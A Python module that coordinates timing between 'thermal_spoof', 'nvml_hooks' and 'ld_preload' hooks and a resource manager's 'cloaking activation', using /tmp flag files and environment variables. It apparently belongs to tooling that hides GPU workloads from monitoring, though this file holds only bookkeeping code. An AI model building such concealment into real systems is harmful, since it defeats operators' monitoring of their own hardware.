#!/usr/bin/env python3
"""
Hook Coordination Manager (Trình quản lý phối hợp hook)
Giải quyết timing conflict giữa Enhanced Hook Sequencing và Resource Manager
"""

import os
import time
import threading
import json
from datetime import datetime
from pathlib import Path

class HookCoordinator:
    """
    Hook Coordination Manager (Trình quản lý phối hợp hook)
    Đồng bộ giữa PHASE 3+ và Resource Manager cloaking activation
    """
    
    def __init__(self):
        self.coordination_file = "/tmp/hook_coordination.json"
        self.lock = threading.Lock()
        self.hook_status = {
            'thermal_spoof': False,
            'nvml_hooks': False,
            'ld_preload': False,
            'phase3_completed': False,
            'resource_manager_ready': False
        }
        self.registered_pids = {}
        
    def register_pid_for_coordination(self, pid: int, metadata: dict):
        """
        Register PID for hook coordination (đăng ký PID để phối hợp hook)
        Called by stealth_inference_cuda.py after PID registration
        """
        with self.lock:
            self.registered_pids[pid] = {
                'metadata': metadata,
                'registration_time': time.time(),
                'hooks_ready': False,
                'resource_manager_notified': False
            }
            
            # Save to coordination file
            self._save_coordination_state()
            
            print(f"🔗 [HOOK-COORD] PID {pid} registered for coordination")
            
    def notify_phase3_completion(self, pid: int):
        """
        Notify that PHASE 3+ hook re-enabling completed (thông báo PHASE 3+ hoàn thành)
        Called by PHASE 3+ when hooks are re-enabled
        """
        with self.lock:
            if pid in self.registered_pids:
                self.registered_pids[pid]['hooks_ready'] = True
                self.registered_pids[pid]['phase3_completion_time'] = time.time()
                
                # Save state
                self._save_coordination_state()
                
                print(f"✅ [HOOK-COORD] PID {pid} hooks ready - notifying Resource Manager")
                
                # Trigger Resource Manager cloaking activation
                self._notify_resource_manager(pid)
                
    def _notify_resource_manager(self, pid: int):
        """
        Notify Resource Manager that hooks are ready (thông báo Resource Manager hooks sẵn sàng)
        """
        try:
            # Method 1: Environment variable flag
            os.environ[f'HOOKS_READY_PID_{pid}'] = '1'
            
            # Method 2: Create notification file
            notification_file = f"/tmp/hooks_ready_{pid}.flag"
            with open(notification_file, 'w') as f:
                json.dump({
                    'pid': pid,
                    'timestamp': time.time(),
                    'status': 'hooks_ready',
                    'thermal_spoof': True,
                    'nvml_hooks': True,
                    'ld_preload': True
                }, f)
                
            print(f"📢 [HOOK-COORD] Resource Manager notified for PID {pid}")
            
        except Exception as e:
            print(f"❌ [HOOK-COORD] Failed to notify Resource Manager: {e}")
            
    def _save_coordination_state(self):
        """
        Save coordination state to file (lưu trạng thái phối hợp)
        """
        try:
            state = {
                'timestamp': time.time(),
                'hook_status': self.hook_status,
                'registered_pids': self.registered_pids
            }
            
            with open(self.coordination_file, 'w') as f:
                json.dump(state, f, indent=2)
                
        except Exception as e:
            print(f"⚠️ [HOOK-COORD] Failed to save state: {e}")
            
    def check_hooks_ready(self, pid: int) -> bool:
        """
        Check if hooks are ready for Resource Manager activation
        Called by Resource Manager before cloaking activation
        """
        with self.lock:
            if pid in self.registered_pids:
                return self.registered_pids[pid].get('hooks_ready', False)
                
            # Fallback: Check environment variable
            return os.environ.get(f'HOOKS_READY_PID_{pid}') == '1'
            
    def wait_for_hooks_ready(self, pid: int, timeout: int = 70) -> bool:
        """
        Wait for hooks to be ready (chờ hooks sẵn sàng)
        Called by Resource Manager with timeout
        """
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.check_hooks_ready(pid):
                print(f"✅ [HOOK-COORD] Hooks ready for PID {pid}")
                return True
                
            time.sleep(2)  # Check every 2 seconds
            
        print(f"⏰ [HOOK-COORD] Timeout waiting for hooks ready PID {pid}")
        return False
        
    def cleanup_pid(self, pid: int):
        """
        Clean up coordination data for terminated PID
        """
        with self.lock:
            if pid in self.registered_pids:
                del self.registered_pids[pid]
                
            # Clean up environment variables
            env_var = f'HOOKS_READY_PID_{pid}'
            if env_var in os.environ:
                del os.environ[env_var]
                
            # Clean up notification file
            notification_file = f"/tmp/hooks_ready_{pid}.flag"
            if os.path.exists(notification_file):
                os.remove(notification_file)
                
            print(f"🧹 [HOOK-COORD] Cleaned up coordination for PID {pid}")

# Global singleton instance
_hook_coordinator = None
_coordinator_lock = threading.Lock()

def get_hook_coordinator() -> HookCoordinator:
    """
    Get global hook coordinator singleton (lấy singleton coordinator)
    """
    global _hook_coordinator
    
    with _coordinator_lock:
        if _hook_coordinator is None:
            _hook_coordinator = HookCoordinator()
            
        return _hook_coordinator

# Usage examples for integration:
if __name__ == "__main__":
    # Test coordination workflow
    coordinator = get_hook_coordinator()
    
    # Simulate PID registration
    test_pid = 12345
    coordinator.register_pid_for_coordination(test_pid, {'test': True})
    
    # Simulate PHASE 3+ completion
    time.sleep(1)
    coordinator.notify_phase3_completion(test_pid)
    
    # Simulate Resource Manager check
    hooks_ready = coordinator.check_hooks_ready(test_pid)
    print(f"Hooks ready for PID {test_pid}: {hooks_ready}")
    
    # Clean up
    coordinator.cleanup_pid(test_pid)
    